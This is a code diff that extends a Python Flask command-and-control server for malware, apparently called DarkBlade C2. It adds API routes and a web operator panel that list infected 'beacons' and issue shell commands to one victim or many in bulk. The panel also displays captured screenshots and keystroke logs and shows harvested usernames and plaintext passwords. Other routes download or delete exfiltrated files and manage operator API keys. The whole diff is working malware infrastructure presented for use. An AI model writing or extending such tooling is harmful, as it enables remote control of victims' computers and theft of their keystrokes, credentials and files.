@@ -380,12 +380,73 @@ class C2Database:
         self.conn = None
         self.lock = Lock()
         self.init_db()
+
+    # ---- API Keys helpers ----
+    def list_api_keys(self):
+        try:
+            with self.lock:
+                cur = self.conn.cursor()
+                cur.execute('SELECT key_hash, username, role, description, created, last_used, permissions FROM api_keys ORDER BY created DESC')
+                rows = cur.fetchall()
+                return rows
+        except Exception as e:
+            logger.error(f"Failed to list api keys: {e}", exc_info=True)
+            raise
+
+    def delete_api_key(self, key_hash):
+        try:
+            with self.lock:
+                cur = self.conn.cursor()
+                cur.execute('DELETE FROM api_keys WHERE key_hash = ?', (key_hash,))
+                self.conn.commit()
+                return cur.rowcount
+        except Exception as e:
+            logger.error(f"Failed to delete api key: {e}", exc_info=True)
+            raise
+
+    # ---- Exfil/files helpers ----
+    def list_exfil_by_beacon(self, beacon_id, limit=100):
+        try:
+            with self.lock:
+                cur = self.conn.cursor()
+                cur.execute('''SELECT id, data_type, filename, file_size, timestamp FROM exfil_data 
+                               WHERE beacon_id = ? ORDER BY timestamp DESC LIMIT ?''', (beacon_id, limit))
+                return cur.fetchall()
+        except Exception as e:
+            logger.error(f"Failed to list exfil: {e}", exc_info=True)
+            raise
+
+    def get_exfil_blob(self, file_id):
+        try:
+            with self.lock:
+                cur = self.conn.cursor()
+                cur.execute('SELECT filename, data, encrypted FROM exfil_data WHERE id = ?', (file_id,))
+                row = cur.fetchone()
+                return row
+        except Exception as e:
+            logger.error(f"Failed to get exfil blob: {e}", exc_info=True)
+            raise
+
+    def delete_exfil(self, file_id):
+        try:
+            with self.lock:
+                cur = self.conn.cursor()
+                cur.execute('DELETE FROM exfil_data WHERE id = ?', (file_id,))
+                self.conn.commit()
+                return cur.rowcount
+        except Exception as e:
+            logger.error(f"Failed to delete exfil: {e}", exc_info=True)
+            raise
     
     def init_db(self):
         """Initialize database schema with new tables"""
         try:
             self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
             cursor = self.conn.cursor()
+            # Pragmas for reliability/perf
+            cursor.execute('PRAGMA journal_mode=WAL;')
+            cursor.execute('PRAGMA synchronous=NORMAL;')
+            cursor.execute('PRAGMA temp_store=MEMORY;')
             
             # Beacons table (enhanced with tags)
             cursor.execute('''\
@@ -559,6 +620,12 @@ class C2Database:
                 )
             ''')
             
+            # Indexes
+            cursor.execute('CREATE INDEX IF NOT EXISTS idx_beacons_last_seen ON beacons(last_seen);')
+            cursor.execute('CREATE INDEX IF NOT EXISTS idx_cmd_beacon ON commands(beacon_id);')
+            cursor.execute('CREATE INDEX IF NOT EXISTS idx_exfil_beacon ON exfil_data(beacon_id);')
+            cursor.execute('CREATE INDEX IF NOT EXISTS idx_keylog_beacon ON keylogs(beacon_id);')
+            
             self.conn.commit()
             logger.info("Database initialized successfully")
         except Exception as e:
@@ -607,7 +674,7 @@ class C2Database:
             logger.error(f"Failed to update beacon health: {e}", exc_info=True)
             raise
     
-    def get_beacons(self, active_only=False, group=None, tags=None):
+    def get_beacons(self, active_only=False, group=None, tags=None, limit=100, offset=0):
         """Get beacons with filtering options - SECURITY: Safe parameterized queries"""
         try:
             with self.lock:
@@ -627,7 +694,8 @@ class C2Database:
                     query += ' AND tags LIKE ?'
                     params.append(f'%{tags}%')
                 
-                query += ' ORDER BY last_seen DESC'
+                query += ' ORDER BY last_seen DESC LIMIT ? OFFSET ?'
+                params.extend([int(limit), int(offset)])
                 cursor.execute(query, params)
                 return cursor.fetchall()
         except Exception as e:
@@ -690,10 +758,16 @@ class C2Database:
             raise
     
     def update_command_result(self, command_id, result):
-        """Update command result"""
+        """Update command result (truncates to 200 KB)"""
         try:
             command_id = int(command_id)
-            result = InputValidator.sanitize_string(result, 100000)
+            if not isinstance(result, str):
+                result = str(result)
+            # Cap size to 200 KB to keep DB small
+            max_len = 200 * 1024
+            if len(result) > max_len:
+                result = result[:max_len] + "\n[truncated]"
+            result = InputValidator.sanitize_string(result, 210000)
             
             with self.lock:
                 cursor = self.conn.cursor()
@@ -977,7 +1051,16 @@ class C2Server:
         self.use_ssl = use_ssl
         self.use_ngrok = use_ngrok
         self.app = Flask(__name__)
+        self.app.config['MAX_CONTENT_LENGTH'] = 10 * 1024 * 1024  # 10MB upload cap
         self.sock = Sock(self.app)
+        # Web UI dir (if present)
+        self._webui_dir = (Path(__file__).resolve().parent / 'webui')
+        # If build was copied as webui/out, use that
+        try:
+            if (self._webui_dir / 'out').exists():
+                self._webui_dir = self._webui_dir / 'out'
+        except Exception:
+            pass
         self.app.secret_key = secrets.token_hex(32)
         
         # Initialize security components
@@ -1015,7 +1098,17 @@ class C2Server:
             response.headers['X-Frame-Options'] = 'DENY'
             response.headers['X-XSS-Protection'] = '1; mode=block'
             response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
-            response.headers['Content-Security-Policy'] = "default-src 'self'"
+            # Relaxed CSP to allow SPA assets, inline styles/scripts produced by Next export, images, and blobs
+            csp = [
+                "default-src 'self'",
+                "script-src 'self' 'unsafe-inline' 'unsafe-eval' blob:",
+                "style-src 'self' 'unsafe-inline'",
+                "img-src 'self' data: blob:",
+                "font-src 'self' data:",
+                "connect-src 'self'",
+                "frame-ancestors 'none'",
+            ]
+            response.headers['Content-Security-Policy'] = '; '.join(csp)
             return response
         
         # Setup routes
@@ -1081,13 +1174,235 @@ class C2Server:
         # Web UI
         @self.app.route('/')
         def index():
+            # Serve built web UI if available (prefer /c2 SPA)
+            try:
+                # Prefer c2.html (Next static export page) if present
+                c2html = self._webui_dir / 'c2.html'
+                if c2html.exists():
+                    return send_file(str(c2html))
+                # Fallback to /c2/index.html for alternative exports
+                idx_c2 = self._webui_dir / 'c2' / 'index.html'
+                if idx_c2.exists():
+                    return send_file(str(idx_c2))
+                # Fallback to root index.html
+                idx = self._webui_dir / 'index.html'
+                if idx.exists():
+                    return send_file(str(idx))
+            except Exception:
+                pass
             return render_template_string('''
                 <!DOCTYPE html>
                 <html>
-                <head><title>DarkSec C2 - Secure Edition</title></head>
-                <body>
-                    <h1>DarkSec C2 Server - Security Hardened</h1>
-                    <p>API documentation available at /api/docs</p>
+                <head>
+                    <meta charset="utf-8"/>
+                    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+                    <title>DarkBlade C2</title>
+                    <script src="https://cdn.tailwindcss.com"></script>
+                    <style>
+                        :root{--pink:#ff2f92;--cyan:#00e0ff;--bg:#0b0c10;--panel:#12131a;--text:#e5e7eb}
+                        body{background:var(--bg);color:var(--text)}
+                        .brand{color:var(--pink)} .accent{color:var(--cyan)}
+                        .card{background:var(--panel)}
+                        .mono{font-family: ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace}
+                        .btn{background:var(--pink)} .btn:hover{filter:brightness(1.1)}
+                        .tab-btn{border-bottom:2px solid transparent}
+                        .tab-btn.active{border-color:var(--pink);color:var(--pink)}
+                    </style>
+                </head>
+                <body class="min-h-screen">
+                    <header class="flex items-center justify-between p-4 border-b border-zinc-800">
+                        <div class="flex items-center gap-3">
+                            <img src="/favicon.ico" onerror="this.remove()" class="w-6 h-6"/>
+                            <h1 class="text-xl font-bold brand">DarkBlade C2</h1>
+                            <span class="text-xs opacity-60">Security Hardened</span>
+                        </div>
+                        <div class="flex items-center gap-2">
+                            <label class="text-sm opacity-70">API Key</label>
+                            <input id="apiKey" type="password" class="mono px-2 py-1 rounded bg-zinc-900 border border-zinc-700 w-[380px]" placeholder="Paste API key"/>
+                            <label class="text-sm"><input id="showKey" type="checkbox" class="mr-1">show</label>
+                            <button id="saveKey" class="px-3 py-1 rounded btn text-black font-semibold">Save</button>
+                        </div>
+                    </header>
+
+                    <main class="p-4 grid grid-cols-12 gap-4">
+                        <aside class="col-span-12 lg:col-span-3 space-y-3">
+                            <div class="card rounded p-3">
+                                <div class="text-sm opacity-70">Server</div>
+                                <div class="mono text-xs mt-1">Local: <span id="srvLocal">{{request.host_url.rstrip('/')}}</span></div>
+                                <div class="mono text-xs">Public: <span id="srvPublic">(if using ngrok)</span></div>
+                            </div>
+                            <div class="card rounded p-3">
+                                <div class="text-sm opacity-70 mb-2">Views</div>
+                                <nav class="space-y-1">
+                                    <button class="w-full text-left tab-btn py-1" data-tab="beacons">Beacons</button>
+                                    <button class="w-full text-left tab-btn py-1" data-tab="history">History</button>
+                                    <button class="w-full text-left tab-btn py-1" data-tab="screens">Screenshots</button>
+                                    <button class="w-full text-left tab-btn py-1" data-tab="keylogs">Keylogs</button>
+                                    <button class="w-full text-left tab-btn py-1" data-tab="creds">Credentials</button>
+                                </nav>
+                            </div>
+                        </aside>
+
+                        <section class="col-span-12 lg:col-span-9 space-y-4">
+                            <div id="panel-beacons" class="card rounded p-3 hidden">
+                                <div class="flex items-center justify-between">
+                                    <h2 class="font-semibold">Active Beacons</h2>
+                                    <div class="flex items-center gap-2">
+                                        <button id="refresh" class="px-3 py-1 rounded bg-zinc-800 border border-zinc-700">Refresh</button>
+                                        <span class="text-xs opacity-70">Selected: <input id="selBeacon" class="mono text-xs bg-transparent border-b border-zinc-600 w-64" readonly></span>
+                                    </div>
+                                </div>
+                                <div class="overflow-auto mt-2">
+                                    <table class="w-full text-sm">
+                                        <thead class="text-left opacity-70">
+                                            <tr><th>ID</th><th>Host</th><th>User</th><th>OS</th><th>IP</th><th>Last Seen</th><th>Health</th></tr>
+                                        </thead>
+                                        <tbody id="beaconRows"></tbody>
+                                    </table>
+                                </div>
+                                <div class="mt-3 flex items-center gap-2">
+                                    <input id="cmd" class="mono px-2 py-1 rounded bg-zinc-900 border border-zinc-700 w-full" placeholder="whoami">
+                                    <button id="send" class="px-3 py-1 rounded btn text-black font-semibold">Send</button>
+                                </div>
+                            </div>
+
+                            <div id="panel-history" class="card rounded p-3 hidden">
+                                <h2 class="font-semibold mb-2">Command History</h2>
+                                <pre id="history" class="mono bg-black/70 p-3 rounded max-h-[420px] overflow-auto"></pre>
+                            </div>
+
+                            <div id="panel-screens" class="card rounded p-3 hidden">
+                                <h2 class="font-semibold mb-2">Screenshots</h2>
+                                <div id="shots" class="grid grid-cols-2 md:grid-cols-3 gap-3"></div>
+                            </div>
+
+                            <div id="panel-keylogs" class="card rounded p-3 hidden">
+                                <h2 class="font-semibold mb-2">Keylogs</h2>
+                                <pre id="keylogBox" class="mono bg-black/70 p-3 rounded max-h-[420px] overflow-auto"></pre>
+                            </div>
+
+                            <div id="panel-creds" class="card rounded p-3 hidden">
+                                <h2 class="font-semibold mb-2">Credentials</h2>
+                                <div id="creds" class="overflow-auto"></div>
+                            </div>
+                        </section>
+                    </main>
+
+                    <script>
+                        const apiKeyEl = document.getElementById('apiKey');
+                        const showKey = document.getElementById('showKey');
+                        const saveKey = document.getElementById('saveKey');
+                        const refreshBtn = document.getElementById('refresh');
+                        const selBeacon = document.getElementById('selBeacon');
+                        const cmd = document.getElementById('cmd');
+                        const sendBtn = document.getElementById('send');
+                        const historyBox = document.getElementById('history');
+                        const beaconRows = document.getElementById('beaconRows');
+                        const shots = document.getElementById('shots');
+                        const keylogBox = document.getElementById('keylogBox');
+                        const credsBox = document.getElementById('creds');
+
+                        // Tabs
+                        const tabs = ['beacons','history','screens','keylogs','creds'];
+                        const btns = document.querySelectorAll('.tab-btn');
+                        function showTab(name){
+                            tabs.forEach(t=>{
+                                document.getElementById('panel-'+t).classList.toggle('hidden', t!==name);
+                            });
+                            btns.forEach(b=>b.classList.toggle('active', b.dataset.tab===name));
+                        }
+                        btns.forEach(b=>b.addEventListener('click',()=>showTab(b.dataset.tab)));
+                        showTab('beacons');
+
+                        // Load saved key
+                        apiKeyEl.value = localStorage.getItem('darkblade_api_key') || '';
+                        showKey.addEventListener('change', () => { apiKeyEl.type = showKey.checked ? 'text' : 'password'; });
+                        saveKey.addEventListener('click', () => { localStorage.setItem('darkblade_api_key', apiKeyEl.value.trim()); alert('Saved'); });
+
+                        async function fetchBeacons() {
+                            beaconRows.innerHTML = '<tr><td colspan=7 class="opacity-60">Loading...</td></tr>';
+                            try {
+                                const res = await fetch('/api/beacons', { headers: { 'X-API-Key': apiKeyEl.value.trim() }});
+                                if (!res.ok) { beaconRows.innerHTML = `<tr><td colspan=7>Error ${res.status}</td></tr>`; return; }
+                                const data = await res.json();
+                                const rows = (data.beacons || []).map(b => `
+                                    <tr class="hover:bg-zinc-800/60 cursor-pointer" data-id="${b.id}">
+                                        <td class="mono text-xs">${b.id}</td>
+                                        <td>${b.hostname||''}</td>
+                                        <td>${b.username||''}</td>
+                                        <td>${b.os||''}</td>
+                                        <td>${b.ip||''}</td>
+                                        <td class="mono text-xs">${b.last_seen||''}</td>
+                                        <td>${b.health||''}</td>
+                                    </tr>`).join('');
+                                beaconRows.innerHTML = rows || '<tr><td colspan=7 class="opacity-60">No beacons</td></tr>';
+                                document.querySelectorAll('#beaconRows tr').forEach(tr => {
+                                    tr.addEventListener('click', () => {
+                                        document.querySelectorAll('#beaconRows tr').forEach(x=>x.classList.remove('bg-zinc-800'));
+                                        tr.classList.add('bg-zinc-800');
+                                        const id = tr.getAttribute('data-id');
+                                        selBeacon.value = id;
+                                        fetchHistory(id); fetchScreens(id); fetchKeylogs(id);
+                                    });
+                                });
+                            } catch (e) { beaconRows.innerHTML = `<tr><td colspan=7>${e}</td></tr>`; }
+                        }
+
+                        async function fetchHistory(id) {
+                            historyBox.textContent = 'Loading...';
+                            try {
+                                const res = await fetch(`/api/beacon/${id}/history?limit=50`, { headers: { 'X-API-Key': apiKeyEl.value.trim() }});
+                                if (!res.ok) { historyBox.textContent = `Error ${res.status}`; return; }
+                                const data = await res.json();
+                                const lines = data.history.map(h => `[${h.timestamp}] ${h.operator} ${h.status} > ${h.command}\n${(h.result||'').trim()}\n`).join('\n');
+                                historyBox.textContent = lines || 'No history';
+                            } catch (e) { historyBox.textContent = String(e); }
+                        }
+
+                        async function fetchScreens(id){
+                            shots.innerHTML = '<div class="opacity-60">Loading...</div>';
+                            try{
+                                const res = await fetch(`/api/beacon/${id}/screenshots`, { headers: { 'X-API-Key': apiKeyEl.value.trim() }});
+                                if(!res.ok){ shots.innerHTML = `<div>Error ${res.status}</div>`; return; }
+                                const data = await res.json();
+                                shots.innerHTML = (data.items||[]).map(s=>`<div><div class="mono text-xs opacity-60 mb-1">${s.timestamp}</div><img class="rounded border border-zinc-700" src="/api/screenshot/${s.id}?api_key=${encodeURIComponent(apiKeyEl.value.trim())}"/></div>`).join('') || '<div class="opacity-60">No screenshots</div>';
+                            }catch(e){ shots.innerHTML = `<div>${e}</div>`; }
+                        }
+
+                        async function fetchKeylogs(id){
+                            keylogBox.textContent = 'Loading...';
+                            try{
+                                const res = await fetch(`/api/beacon/${id}/keylogs`, { headers: { 'X-API-Key': apiKeyEl.value.trim() }});
+                                if(!res.ok){ keylogBox.textContent = `Error ${res.status}`; return; }
+                                const data = await res.json();
+                                keylogBox.textContent = (data.items||[]).map(k=>`[${k.timestamp}] ${k.window} \n${k.keystrokes}`).join('\n\n') || 'No keylogs';
+                            }catch(e){ keylogBox.textContent = String(e); }
+                        }
+
+                        async function fetchCreds(){
+                            credsBox.innerHTML = 'Loading...';
+                            try{
+                                const res = await fetch(`/api/credentials`, { headers: { 'X-API-Key': apiKeyEl.value.trim() }});
+                                if(!res.ok){ credsBox.innerHTML = `Error ${res.status}`; return; }
+                                const data = await res.json();
+                                const rows = (data.items||[]).map(c=>`<tr><td class="mono text-xs">${c.beacon_id}</td><td>${c.source}</td><td>${c.username}</td><td class="mono">${c.password}</td><td>${c.domain||''}</td><td class="mono text-xs">${c.timestamp}</td></tr>`).join('');
+                                credsBox.innerHTML = `<table class="w-full text-sm"><thead class="opacity-70 text-left"><tr><th>Beacon</th><th>Source</th><th>User</th><th>Password</th><th>Domain</th><th>Time</th></tr></thead><tbody>${rows || '<tr><td colspan=6 class="opacity-60">No credentials</td></tr>'}</tbody></table>`;
+                            }catch(e){ credsBox.innerHTML = String(e); }
+                        }
+
+                        async function sendCommand(){
+                            const id = selBeacon.value.trim();
+                            if(!id){ alert('Select a beacon first'); return; }
+                            const c = cmd.value.trim(); if(!c) return;
+                            const res = await fetch(`/api/beacon/${id}/command`, { method:'POST', headers:{ 'Content-Type':'application/json','X-API-Key': apiKeyEl.value.trim() }, body: JSON.stringify({command:c})});
+                            if(!res.ok){ alert('Error '+res.status); return; }
+                            cmd.value=''; setTimeout(()=>{ fetchHistory(id); }, 1000);
+                        }
+
+                        refreshBtn.addEventListener('click', ()=>{ fetchBeacons(); fetchCreds(); });
+                        sendBtn.addEventListener('click', sendCommand);
+                        window.addEventListener('load', ()=>{ fetchBeacons(); fetchCreds(); });
+                    </script>
                 </body>
                 </html>
             ''')
@@ -1229,7 +1544,7 @@ class C2Server:
                     self._log_request('unauthorized', 401)
                     return jsonify({'error': 'Unauthorized'}), 401
                 
-                # Rate limit
+                # Rate limit (per-key)
                 if not self._check_rate_limit(f"api_{api_key[:16]}"):
                     abort(429)
                 
@@ -1238,8 +1553,10 @@ class C2Server:
                 group = request.args.get('group')
                 tags = request.args.get('tags')
                 active_only = request.args.get('active') == 'true'
+                limit = int(request.args.get('limit', 100))
+                offset = int(request.args.get('offset', 0))
                 
-                beacons = self.db.get_beacons(active_only=active_only, group=group, tags=tags)
+                beacons = self.db.get_beacons(active_only=active_only, group=group, tags=tags, limit=limit, offset=offset)
                 
                 self._log_request(user_info['username'], 200)
                 
@@ -1311,7 +1628,243 @@ class C2Server:
         # - Request logging
         # - Audit logging
         
+        # API: Command history for a beacon
+        @self.app.route('/api/beacon/<beacon_id>/history', methods=['GET'])
+        def beacon_history(beacon_id):
+            try:
+                api_key = request.headers.get('X-API-Key')
+                if not self._verify_permission(api_key, 'read'):
+                    self._log_request('unauthorized', 401)
+                    return jsonify({'error': 'Unauthorized'}), 401
+                # Rate limit
+                if not self._check_rate_limit(f"hist_{beacon_id}"):
+                    abort(429)
+                limit = request.args.get('limit', 100)
+                rows = self.db.get_command_history(beacon_id, limit)
+                out = []
+                for r in rows:
+                    out.append({
+                        'id': r[0],
+                        'command': r[1],
+                        'timestamp': r[2],
+                        'status': r[3],
+                        'result': r[4],
+                        'operator': r[5],
+                    })
+                return jsonify({'history': out})
+            except Exception as e:
+                logger.error(f"Beacon history error: {e}", exc_info=True)
+                return jsonify({'error': 'Internal server error'}), 500
+
+        # API: Screenshots list for beacon
+        @self.app.route('/api/beacon/<beacon_id>/screenshots', methods=['GET'])
+        def beacon_screenshots(beacon_id):
+            try:
+                api_key = request.headers.get('X-API-Key')
+                if not self._verify_permission(api_key, 'read'):
+                    return jsonify({'error': 'Unauthorized'}), 401
+                limit = int(request.args.get('limit', 30))
+                offset = int(request.args.get('offset', 0))
+                cursor = self.db.conn.cursor()
+                cursor.execute('SELECT id, timestamp FROM screenshots WHERE beacon_id = ? ORDER BY timestamp DESC LIMIT ? OFFSET ?', (beacon_id, limit, offset))
+                items = [{'id': r[0], 'timestamp': r[1]} for r in cursor.fetchall()]
+                return jsonify({'items': items})
+            except Exception as e:
+                logger.error(f"Screenshots list error: {e}", exc_info=True)
+                return jsonify({'error': 'Internal server error'}), 500
+
+        # API: Serve screenshot image (supports header or ?api_key=)
+        @self.app.route('/api/screenshot/<int:shot_id>', methods=['GET'])
+        def get_screenshot(shot_id):
+            try:
+                api_key = request.headers.get('X-API-Key') or request.args.get('api_key')
+                if not self._verify_permission(api_key, 'read'):
+                    return jsonify({'error': 'Unauthorized'}), 401
+                cursor = self.db.conn.cursor()
+                cursor.execute('SELECT image_data, timestamp FROM screenshots WHERE id = ?', (shot_id,))
+                row = cursor.fetchone()
+                if not row:
+                    return jsonify({'error': 'Not found'}), 404
+                data = row[0]
+                return send_file(io.BytesIO(data), mimetype='image/png')
+            except Exception as e:
+                logger.error(f"Serve screenshot error: {e}", exc_info=True)
+                return jsonify({'error': 'Internal server error'}), 500
+
+        # API: Keylogs for beacon
+        @self.app.route('/api/beacon/<beacon_id>/keylogs', methods=['GET'])
+        def beacon_keylogs(beacon_id):
+            try:
+                api_key = request.headers.get('X-API-Key')
+                if not self._verify_permission(api_key, 'read'):
+                    return jsonify({'error': 'Unauthorized'}), 401
+                limit = int(request.args.get('limit', 100))
+                offset = int(request.args.get('offset', 0))
+                cursor = self.db.conn.cursor()
+                cursor.execute('SELECT keystrokes, window_title, timestamp FROM keylogs WHERE beacon_id = ? ORDER BY timestamp DESC LIMIT ? OFFSET ?', (beacon_id, limit, offset))
+                items = [{'keystrokes': r[0], 'window': r[1], 'timestamp': r[2]} for r in cursor.fetchall()]
+                return jsonify({'items': items})
+            except Exception as e:
+                logger.error(f"Keylogs list error: {e}", exc_info=True)
+                return jsonify({'error': 'Internal server error'}), 500
+
+        # API: Credentials (optionally filter by beacon)
+        @self.app.route('/api/credentials', methods=['GET'])
+        def list_credentials():
+            try:
+                api_key = request.headers.get('X-API-Key')
+                if not self._verify_permission(api_key, 'read'):
+                    return jsonify({'error': 'Unauthorized'}), 401
+                beacon = request.args.get('beacon')
+                limit = int(request.args.get('limit', 100))
+                offset = int(request.args.get('offset', 0))
+                cursor = self.db.conn.cursor()
+                if beacon:
+                    cursor.execute('SELECT beacon_id, source, username, password, domain, timestamp FROM credentials WHERE beacon_id = ? ORDER BY timestamp DESC LIMIT ? OFFSET ?', (beacon, limit, offset))
+                else:
+                    cursor.execute('SELECT beacon_id, source, username, password, domain, timestamp FROM credentials ORDER BY timestamp DESC LIMIT ? OFFSET ?', (limit, offset))
+                items = [{'beacon_id': r[0], 'source': r[1], 'username': r[2], 'password': r[3], 'domain': r[4], 'timestamp': r[5]} for r in cursor.fetchall()]
+                return jsonify({'items': items})
+            except Exception as e:
+                logger.error(f"Credentials list error: {e}", exc_info=True)
+                return jsonify({'error': 'Internal server error'}), 500
+
+        # API: List exfil files for a beacon
+        @self.app.route('/api/beacon/<beacon_id>/files', methods=['GET'])
+        def list_beacon_files(beacon_id):
+            try:
+                api_key = request.headers.get('X-API-Key')
+                if not self._verify_permission(api_key, 'read'):
+                    return jsonify({'error': 'Unauthorized'}), 401
+                limit = int(request.args.get('limit', 100))
+                rows = self.db.list_exfil_by_beacon(beacon_id, limit)
+                items = [{'id': r[0], 'type': r[1], 'filename': r[2], 'size': r[3], 'timestamp': r[4]} for r in rows]
+                return jsonify({'items': items})
+            except Exception as e:
+                logger.error(f"List files error: {e}", exc_info=True)
+                return jsonify({'error': 'Internal server error'}), 500
+
+        # API: Download exfil file
+        @self.app.route('/api/file/<int:file_id>', methods=['GET'])
+        def download_file(file_id):
+            try:
+                api_key = request.headers.get('X-API-Key') or request.args.get('api_key')
+                if not self._verify_permission(api_key, 'read'):
+                    return jsonify({'error': 'Unauthorized'}), 401
+                row = self.db.get_exfil_blob(file_id)
+                if not row:
+                    return jsonify({'error': 'Not found'}), 404
+                filename, blob, encrypted = row
+                # Note: if encrypted is True, client must decrypt with saved key; we serve raw
+                return send_file(io.BytesIO(blob), as_attachment=True, download_name=filename)
+            except Exception as e:
+                logger.error(f"Download file error: {e}", exc_info=True)
+                return jsonify({'error': 'Internal server error'}), 500
+
+        # API: Delete exfil file
+        @self.app.route('/api/file/<int:file_id>', methods=['DELETE'])
+        def delete_file(file_id):
+            try:
+                api_key = request.headers.get('X-API-Key')
+                if not self._verify_permission(api_key, 'delete'):
+                    return jsonify({'error': 'Unauthorized'}), 401
+                n = self.db.delete_exfil(file_id)
+                return jsonify({'deleted': n})
+            except Exception as e:
+                logger.error(f"Delete file error: {e}", exc_info=True)
+                return jsonify({'error': 'Internal server error'}), 500
+
+        # API: Bulk command to many beacons
+        @self.app.route('/api/beacons/bulk/command', methods=['POST'])
+        def bulk_command():
+            try:
+                api_key = request.headers.get('X-API-Key')
+                user = self.db.verify_api_key(api_key)
+                if not user or 'write' not in user['permissions']:
+                    return jsonify({'error': 'Unauthorized'}), 401
+                data = request.get_json() or {}
+                command = (data.get('command') or '').strip()
+                ids = data.get('beacon_ids') or []
+                group = data.get('group')
+                tags = data.get('tags')
+                if not command:
+                    return jsonify({'error': 'No command specified'}), 400
+                # resolve target set
+                target_ids = set(ids)
+                if group or tags:
+                    rows = self.db.get_beacons(active_only=False, group=group, tags=tags)
+                    for r in rows:
+                        target_ids.add(r[0])
+                count = 0
+                for bid in target_ids:
+                    try:
+                        self.db.add_command(bid, command, user['username'])
+                        count += 1
+                    except Exception:
+                        pass
+                return jsonify({'sent': count})
+            except Exception as e:
+                logger.error(f"Bulk command error: {e}", exc_info=True)
+                return jsonify({'error': 'Internal server error'}), 500
+
+        # API: API key management (admin)
+        @self.app.route('/api/keys', methods=['GET', 'POST'])
+        def api_keys():
+            try:
+                api_key = request.headers.get('X-API-Key')
+                user = self.db.verify_api_key(api_key)
+                if not user or user['role'] != 'admin':
+                    return jsonify({'error': 'Unauthorized'}), 401
+                if request.method == 'GET':
+                    rows = self.db.list_api_keys()
+                    items = [{'key_hash': r[0], 'username': r[1], 'role': r[2], 'description': r[3], 'created': r[4], 'last_used': r[5], 'permissions': r[6]} for r in rows]
+                    return jsonify({'keys': items})
+                data = request.get_json() or {}
+                username = data.get('username') or 'operator'
+                role = data.get('role') or 'operator'
+                perms = data.get('permissions') or 'read,write'
+                key = self.db.create_api_key(username, role, perms)
+                return jsonify({'key': key})
+            except Exception as e:
+                logger.error(f"API key mgmt error: {e}", exc_info=True)
+                return jsonify({'error': 'Internal server error'}), 500
+
+        @self.app.route('/api/keys/<key_hash>', methods=['DELETE'])
+        def api_keys_delete(key_hash):
+            try:
+                api_key = request.headers.get('X-API-Key')
+                user = self.db.verify_api_key(api_key)
+                if not user or user['role'] != 'admin':
+                    return jsonify({'error': 'Unauthorized'}), 401
+                n = self.db.delete_api_key(key_hash)
+                return jsonify({'deleted': n})
+            except Exception as e:
+                logger.error(f"API key delete error: {e}", exc_info=True)
+                return jsonify({'error': 'Internal server error'}), 500
+        
         logger.info("All routes configured with security enhancements")
+
+        # Serve static assets from webui folder
+        @self.app.route('/<path:path>')
+        def static_proxy(path):
+            # let API endpoints pass through
+            if path.startswith('api/'):
+                abort(404)
+            target = self._webui_dir / path
+            try:
+                if target.exists() and target.is_file():
+                    return send_file(str(target))
+                # try HTML suffix (Next export uses route.html)
+                target_html = self._webui_dir / f"{path}.html"
+                if target_html.exists():
+                    return send_file(str(target_html))
+                # fallback to SPA index
+                idx = self._webui_dir / 'index.html'
+                if idx.exists():
+                    return send_file(str(idx))
+            except Exception:
+                pass
+            abort(404)
     
     def run(self):
         """Start C2 server"""
